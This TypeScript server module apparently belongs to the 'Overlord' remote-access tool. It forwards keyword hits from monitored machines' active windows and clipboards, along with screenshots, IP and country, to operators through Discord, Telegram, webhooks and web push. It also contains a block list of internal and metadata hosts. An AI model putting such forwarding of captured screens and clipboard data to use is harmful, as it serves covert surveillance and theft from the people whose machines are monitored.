import { v4 as uuidv4 } from "uuid";
import {
  getNotificationScreenshot,
  saveNotificationScreenshot,
  updateNotificationScreenshotId,
  getAllPushSubscriptions,
  deletePushSubscription,
  type NotificationScreenshotRecord,
  type PushSubscriptionRecord,
} from "../db";
import { logger } from "../logger";
import { sendWebPush } from "./web-push";

export type NotificationRecord = {
  id: string;
  clientId: string;
  host?: string;
  user?: string;
  os?: string;
  title: string;
  process?: string;
  processPath?: string;
  pid?: number;
  keyword?: string;
  category: "active_window" | "clipboard";
  ts: number;
  screenshotId?: string;
};

export type PendingNotificationScreenshot = {
  notificationId: string;
  clientId: string;
  ts: number;
  timeout: NodeJS.Timeout;
};

export type UserDeliveryTarget = {
  userId: number;
  username: string;
  webhookEnabled: boolean;
  webhookUrl: string;
  webhookTemplate: string | null;
  telegramEnabled: boolean;
  telegramBotToken: string;
  telegramChatId: string;
  telegramTemplate: string | null;
  clientEventWebhook: boolean;
  clientEventTelegram: boolean;
  clientEventPush: boolean;
};

export const DEFAULT_WEBHOOK_TEMPLATE =
  `{"type":"notification","data":{"title":"{title}","keyword":"{keyword}","clientId":"{clientId}","user":"{user}","host":"{host}","process":"{process}","os":"{os}","pid":"{pid}","ts":"{ts}"}}`;

export const DEFAULT_TELEGRAM_TEMPLATE =
  `\u{1F514} Notification\nTitle: {title}\nKeyword: {keyword}\nClient: {clientId}\nUser: {user}\nHost: {host}\nProcess: {process}`;

const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
const NOTIFICATION_SCREENSHOT_POLL_MS = 250;

function getScreenshotMeta(format: string | undefined): { contentType: string; ext: string } {
  const normalized = (format || "jpeg").toLowerCase();
  if (normalized === "png") return { contentType: "image/png", ext: "png" };
  if (normalized === "webp") return { contentType: "image/webp", ext: "webp" };
  if (normalized === "jpg" || normalized === "jpeg") return { contentType: "image/jpeg", ext: "jpg" };
  return { contentType: "application/octet-stream", ext: "bin" };
}

export function renderNotificationTemplate(
  template: string | null | undefined,
  record: NotificationRecord,
  defaultTemplate: string,
): string {
  const tpl = template && template.trim() ? template : defaultTemplate;
  return tpl
    .replace(/{title}/g, record.title ?? "")
    .replace(/{keyword}/g, record.keyword ?? "")
    .replace(/{clientId}/g, record.clientId ?? "")
    .replace(/{user}/g, record.user ?? "")
    .replace(/{host}/g, record.host ?? "")
    .replace(/{process}/g, record.process ?? "")
    .replace(/{os}/g, record.os ?? "")
    .replace(/{pid}/g, String(record.pid ?? ""))
    .replace(/{ts}/g, String(record.ts ?? ""));
}

function buildCanonicalWebhookPayload(record: NotificationRecord): string {
  return JSON.stringify({ type: "notification", data: record });
}

function buildWebhookBody(target: UserDeliveryTarget, record: NotificationRecord): string {
  const customTemplate = target.webhookTemplate?.trim() || "";
  if (!customTemplate) {
    return buildCanonicalWebhookPayload(record);
  }

  const rendered = renderNotificationTemplate(customTemplate, record, DEFAULT_WEBHOOK_TEMPLATE);
  try {
    const parsed = JSON.parse(rendered);
    return JSON.stringify(parsed);
  } catch (err) {
    logger.warn(
      `[notify] invalid webhook template for user ${target.username}; falling back to canonical payload`,
      err,
    );
    return buildCanonicalWebhookPayload(record);
  }
}

async function waitForNotificationScreenshot(
  notificationId: string,
  timeoutMs = NOTIFICATION_SCREENSHOT_WAIT_MS,
): Promise<NotificationScreenshotRecord | null> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const screenshot = getNotificationScreenshot(notificationId);
    if (screenshot) return screenshot;
    await new Promise<void>((resolve) => setTimeout(resolve, NOTIFICATION_SCREENSHOT_POLL_MS));
  }
  return null;
}

export function takePendingNotificationScreenshot(
  pendingNotificationScreenshots: Map<string, PendingNotificationScreenshot>,
  clientId: string,
): PendingNotificationScreenshot | null {
  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
    if (pending.clientId !== clientId) continue;
    clearTimeout(pending.timeout);
    pendingNotificationScreenshots.delete(commandId);
    return pending;
  }
  return null;
}

export function storeNotificationScreenshot(
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
): void {
  if (!bytes || bytes.length === 0) return;
  const screenshotId = uuidv4();

  saveNotificationScreenshot({
    id: screenshotId,
    notificationId: pending.notificationId,
    clientId: pending.clientId,
    ts: pending.ts,
    format,
    width,
    height,
    bytes,
  });

  updateNotificationScreenshotId(pending.notificationId, screenshotId);
}

async function deliverToUserWebhook(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.webhookEnabled) return;
  const url = (target.webhookUrl || "").trim();
  if (!url) return;

  let parsed: URL;
  try {
    parsed = new URL(url);
    if (!/^https?:$/.test(parsed.protocol)) return;
  } catch {
    return;
  }

  const hostname = parsed.hostname.toLowerCase();
  const BLOCKED_HOSTS = ["localhost", "metadata.google.internal", "169.254.169.254"];
  if (
    BLOCKED_HOSTS.includes(hostname) ||
    hostname.endsWith(".internal") ||
    hostname.startsWith("127.") ||
    hostname === "[::1]" ||
    /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(hostname) ||
    hostname.startsWith("169.254.") ||
    hostname.startsWith("0.")
  ) {
    logger.warn(`[notify] blocked webhook to private/internal address: ${hostname}`);
    return;
  }

  try {
    const isDiscord = /discord(app)?\.com$/i.test(parsed.hostname);
    if (isDiscord) {
      const embed: Record<string, any> = {
        title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
        description: record.title,
        fields: [
          { name: "Client", value: record.clientId || "unknown", inline: true },
          { name: "User", value: record.user || "unknown", inline: true },
          { name: "Host", value: record.host || "unknown", inline: true },
          { name: "Process", value: record.process || "unknown", inline: true },
        ],
        timestamp: new Date(record.ts).toISOString(),
      };

      const payload: Record<string, any> = {
        content: `\u{1F514} Notification: ${record.title}`,
        embeds: [embed],
      };

      if (screenshot?.bytes?.length) {
        const meta = getScreenshotMeta(screenshot.format);
        const filename = `notification-${record.id}.${meta.ext}`;
        embed.image = { url: `attachment://${filename}` };
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append(
          "files[0]",
          new Blob([screenshot.bytes as any], { type: meta.contentType }),
          filename,
        );
        await fetch(url, { method: "POST", body: form });
        return;
      }

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return;
    }

    const body = buildWebhookBody(target, record);
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
  } catch (err) {
    logger.warn(`[notify] webhook delivery to user ${target.username} failed`, err);
  }
}

const TELEGRAM_MESSAGE_MAX = 4096;
const TELEGRAM_CAPTION_MAX = 1024;

function truncateText(text: string, max: number): string {
  if (text.length <= max) return text;
  return text.slice(0, max - 1) + "…";
}

async function consumeTelegramResponse(res: Response, context: string): Promise<void> {
  try {
    const body = await res.text();
    if (!res.ok) {
      logger.warn(`[notify] ${context}: telegram API ${res.status} — ${body.slice(0, 300)}`);
    }
  } catch { }
}

async function deliverToUserTelegram(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.telegramEnabled) return;
  const token = (target.telegramBotToken || "").trim();
  const chatId = (target.telegramChatId || "").trim();
  if (!token || !chatId) return;

  const text = renderNotificationTemplate(target.telegramTemplate, record, DEFAULT_TELEGRAM_TEMPLATE);

  try {
    if (screenshot?.bytes?.length) {
      const meta = getScreenshotMeta(screenshot.format);
      const filename = `notification-${record.id}.${meta.ext}`;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("caption", truncateText(text, TELEGRAM_CAPTION_MAX));
      form.append("photo", new Blob([screenshot.bytes as any], { type: meta.contentType }), filename);
      const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
      const res = await fetch(apiUrl, { method: "POST", body: form });
      await consumeTelegramResponse(res, `notification photo to ${target.username}`);
      return;
    }

    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: truncateText(text, TELEGRAM_MESSAGE_MAX) }),
    });
    await consumeTelegramResponse(res, `notification to ${target.username}`);
  } catch (err) {
    logger.warn(`[notify] telegram delivery to user ${target.username} (chat ${chatId}) failed`, err);
  }
}

async function deliverToUser(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  await Promise.allSettled([
    deliverToUserWebhook(target, record, screenshot),
    deliverToUserTelegram(target, record, screenshot),
  ]);
}

async function deliverWebPushToAll(
  record: NotificationRecord,
  getUserDeliveryTargets: (clientId: string) => UserDeliveryTarget[],
): Promise<void> {
  const subs = getAllPushSubscriptions();
  if (subs.length === 0) return;

  const targets = getUserDeliveryTargets(record.clientId);
  const allowedUserIds = new Set(targets.map((t) => t.userId));

  const title = record.keyword
    ? `Overlord \u2014 ${record.keyword}`
    : "Overlord \u2014 Notification";
  const lines = [record.title];
  if (record.user) lines.push(`User: ${record.user}`);
  if (record.host) lines.push(`Host: ${record.host}`);
  if (record.process) lines.push(`Process: ${record.process}`);

  const payload = JSON.stringify({
    type: "notification",
    title,
    body: lines.filter(Boolean).join("\n"),
    tag: `overlord-${record.id || Date.now()}`,
    url: "/notifications",
  });

  await Promise.allSettled(
    subs
      .filter((sub) => allowedUserIds.has(sub.userId))
      .map(async (sub) => {
        const result = await sendWebPush(
          { endpoint: sub.endpoint, keys: { p256dh: sub.p256dh, auth: sub.auth } },
          payload,
        );
        if (result.gone) {
          deletePushSubscription(sub.endpoint);
          logger.info(`[web-push] removed gone subscription for user ${sub.userId}`);
        } else if (!result.success) {
          logger.warn(`[web-push] delivery failed for user ${sub.userId}: ${result.error}`);
        }
      }),
  );
}

export async function deliverWebPushClientEvent(
  event: string,
  info: { id: string; host?: string; user?: string; os?: string },
  canUserAccessClient: (userId: number, userRole: string, clientId: string) => boolean,
  getUserRole: (userId: number) => string | undefined,
  isClientEventPushEnabled?: (userId: number) => boolean,
): Promise<void> {
  const subs = getAllPushSubscriptions();
  if (subs.length === 0) return;

  const labels: Record<string, string> = {
    client_online: "\u{1F7E2} Client Online",
    client_offline: "\u{1F534} Client Offline",
    client_purgatory: "\u{1F7E1} Client Awaiting Approval",
  };

  const title = labels[event] || "Overlord \u2014 Client Event";
  const lines: string[] = [];
  if (info.host) lines.push(`Host: ${info.host}`);
  if (info.user) lines.push(`User: ${info.user}`);
  if (info.os) lines.push(`OS: ${info.os}`);
  if (info.id) lines.push(`ID: ${info.id}`);

  const dest = event === "client_purgatory" ? "/purgatory" : "/";

  const payload = JSON.stringify({
    type: "client_event",
    event,
    title,
    body: lines.join("\n") || info.id || "",
    tag: `overlord-client-${event}-${info.id || Date.now()}`,
    url: dest,
  });

  await Promise.allSettled(
    subs.map(async (sub) => {
      const role = getUserRole(sub.userId);
      if (!role) return;
      if (isClientEventPushEnabled && !isClientEventPushEnabled(sub.userId)) return;
      if (event === "client_purgatory") {
        if (role !== "admin" && role !== "operator") return;
      } else if (role !== "admin") {
        if (!canUserAccessClient(sub.userId, role, info.id)) return;
      }

      const result = await sendWebPush(
        { endpoint: sub.endpoint, keys: { p256dh: sub.p256dh, auth: sub.auth } },
        payload,
      );
      if (result.gone) {
        deletePushSubscription(sub.endpoint);
      }
    }),
  );
}

export async function deliverNotificationWithScreenshot(
  record: NotificationRecord,
  getUserDeliveryTargets: (clientId: string) => UserDeliveryTarget[],
): Promise<void> {
  const screenshot = await waitForNotificationScreenshot(record.id);
  const targets = getUserDeliveryTargets(record.clientId);
  await Promise.allSettled([
    ...targets.map((t) => deliverToUser(t, record, screenshot)),
    deliverWebPushToAll(record, getUserDeliveryTargets),
  ]);
}

export type ClientEventInfo = {
  id: string;
  host?: string;
  user?: string;
  os?: string;
  ip?: string;
  country?: string;
};

const CLIENT_EVENT_LABELS: Record<string, string> = {
  client_online: "\u{1F7E2} Client Online",
  client_offline: "\u{1F534} Client Offline",
  client_purgatory: "\u{1F7E1} Client Awaiting Approval",
};

const CLIENT_EVENT_COLORS: Record<string, number> = {
  client_online: 0x22c55e,
  client_offline: 0xef4444,
  client_purgatory: 0xeab308,
};

export async function deliverClientEventToExternalChannels(
  event: string,
  info: ClientEventInfo,
  targets: UserDeliveryTarget[],
): Promise<void> {
  if (targets.length === 0) return;

  const label = CLIENT_EVENT_LABELS[event] || "Client Event";
  const ts = Date.now();

  await Promise.allSettled(
    targets.map(async (target) => {
      if (target.webhookEnabled && target.clientEventWebhook && target.webhookUrl) {
        const url = target.webhookUrl.trim();
        if (!url) return;
        let parsed: URL;
        try {
          parsed = new URL(url);
          if (!/^https?:$/.test(parsed.protocol)) return;
        } catch {
          return;
        }
        try {
          const isDiscord = /discord(app)?\.com$/i.test(parsed.hostname);
          if (isDiscord) {
            const fields = [
              { name: "Client", value: info.id || "unknown", inline: true },
              { name: "User", value: info.user || "unknown", inline: true },
              { name: "Host", value: info.host || "unknown", inline: true },
              { name: "OS", value: info.os || "unknown", inline: true },
            ];
            if (info.ip) fields.push({ name: "IP", value: info.ip, inline: true });
            if (info.country) fields.push({ name: "Country", value: info.country, inline: true });

            const embed: Record<string, any> = {
              title: label,
              color: CLIENT_EVENT_COLORS[event] ?? 0x94a3b8,
              fields,
              timestamp: new Date(ts).toISOString(),
            };
            const payload = { content: label, embeds: [embed] };
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
          } else {
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                type: "client_event",
                event,
                clientId: info.id,
                user: info.user,
                host: info.host,
                os: info.os,
                ip: info.ip,
                country: info.country,
                ts,
              }),
            });
          }
        } catch (err) {
          logger.warn(`[notify] client event webhook delivery to user ${target.username} failed`, err);
        }
      }

      if (target.telegramEnabled && target.clientEventTelegram && target.telegramBotToken && target.telegramChatId) {
        const token = target.telegramBotToken.trim();
        const chatId = target.telegramChatId.trim();
        if (token && chatId) {
          const lines = [label];
          if (info.id) lines.push(`Client: ${info.id}`);
          if (info.user) lines.push(`User: ${info.user}`);
          if (info.host) lines.push(`Host: ${info.host}`);
          if (info.os) lines.push(`OS: ${info.os}`);
          if (info.ip) lines.push(`IP: ${info.ip}`);
          if (info.country) lines.push(`Country: ${info.country}`);

          try {
            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const res = await fetch(apiUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: truncateText(lines.join("\n"), TELEGRAM_MESSAGE_MAX) }),
            });
            await consumeTelegramResponse(res, `client event to ${target.username}`);
          } catch (err) {
            logger.warn(`[notify] client event telegram delivery to user ${target.username} failed`, err);
          }
        }
      }
    }),
  );
}

